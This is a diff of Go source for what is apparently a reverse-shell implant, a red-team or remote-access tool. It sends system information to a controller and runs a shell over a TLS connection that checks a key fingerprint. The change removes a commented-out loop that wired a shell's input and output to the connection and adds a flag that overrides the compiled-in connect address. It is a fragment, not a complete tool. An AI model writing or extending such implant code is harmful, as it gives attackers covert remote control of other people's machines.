@@ -56,26 +56,6 @@ func startShell(conn writer) {
 	send(conn, sitrep.SysInfo())
 	sh.Run()
 	os.Exit(0)
-
-	// for scanner.Scan() {
-	// 	command := scanner.Text()
-	// 	switch command {
-	// 	case "":
-	// 		send(conn, "")
-	// 	case "exit":
-	// 		os.Exit(0)
-	// 	case "shell":
-	// 		cmd := shell.GetShell()
-	// 		cmd.Stdout = conn
-	// 		cmd.Stderr = conn
-	// 		cmd.Stdin = conn
-	// 		cmd.Run()
-	// 	default:
-	// 		argv := strings.Split(command, " ")
-	// 		out := commands.Route(argv)
-	// 		send(conn, out)
-	// 	}
-	// }
 }
 
 func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
@@ -107,6 +87,7 @@ func initReverseShell(connectString string, fingerprint []byte) {
 
 func main() {
 	dev := flag.Bool("dev", false, "Run the shell locally")
+	override := flag.String("connect", "", "Override compile-time-injected connectString")
 	flag.Parse()
 
 	if *dev {
@@ -119,6 +100,11 @@ func main() {
 		if err != nil {
 			os.Exit(ErrCouldNotDecode)
 		}
-		initReverseShell(connectString, bytesFingerprint)
+
+		if *override == "" {
+			initReverseShell(connectString, bytesFingerprint)
+		} else {
+			initReverseShell(*override, bytesFingerprint)
+		}
 	}
 }
